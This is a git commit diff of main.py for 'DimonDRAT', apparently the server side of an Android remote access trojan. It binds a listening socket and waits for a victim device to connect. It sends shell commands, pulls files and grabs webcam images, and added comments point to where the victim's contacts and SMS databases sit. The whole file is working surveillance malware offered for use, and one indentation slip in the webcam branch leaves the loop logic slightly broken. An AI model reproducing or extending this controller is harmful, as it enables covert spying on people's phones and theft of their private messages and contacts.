a9fcd361a92911eb6512df01993d6e2024d02253
SegYT <66474461+SegYT@users.noreply.github.com>
2021-04-18 20:25:45 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,17 +1,32 @@
 import socket
+import pyfiglet
+import os
+
+# To see the contacts of the victim use
+# cd /data/data/com.Android.providers.contacts/databases/
+# and look for a contacts database file
+
+# To see the sms of the victim use
+# cd /data/user_de/0/com.android.providers.telephony/databases/
+# and look for a mmssms database file
 
 SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 5003
+SERVER_PORT = 3333
 
 BUFFER_SIZE = 4096
+
+intro = pyfiglet.figlet_format("DimonDRAT")
 
 s = socket.socket()
 
 s.bind((SERVER_HOST, SERVER_PORT))
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.listen(5)
-print("DimonDRAT - Coded by SegYT\n")
-print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+s.listen(10)
+
+os.system("clear")
+print(intro)
+print("\nCoded by SegYT\n")
+print("[...] Listening as " + str(SERVER_HOST) + ":" + str(SERVER_PORT) + "...")
 
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
@@ -23,28 +38,27 @@ def download():
   filename = input("[*]File Name: ")
   client_socket.send(filename)
   f = open(filename, "wb")
-  command = client_socket.recv(4096)
   i = client_socket.recv(4096)
-  while not ("[*]Complete!" in str(i)):
+  while not ("[*] Complete!" in str(i)):
     f.write(i)
     i = client_socket.recv(4096)
   f.close()
 
 while True:
-    command = input("DimonDRAT >")
-    client_socket.send(command.encode())
-    if str(command) == "download":
-      download()
-      continue
-    if str(command) == "webcamsnap":
-      f = open("camera.png", "wb")
-      img = client_socket.recv(4096)
-      f.write(img)
+  command = input("DimonDRAT > ")
+  client_socket.send(command.encode())
+  if str(command) == "download":
+    download()
+    continue
+  if str(command) == "webcamsnap":
+    f = open("camera.png", "wb")
+    img = client_socket.recv(4096)
+    f.write(img)
     f.close()
     continue
-    if command.lower() == "exit":
-        break
-    results = client_socket.recv(BUFFER_SIZE).decode()
-    print(results)
+  if command.lower() == "exit":
+    break
+  results = client_socket.recv(BUFFER_SIZE).decode()
+  print(results)
 client_socket.close()
 s.close()
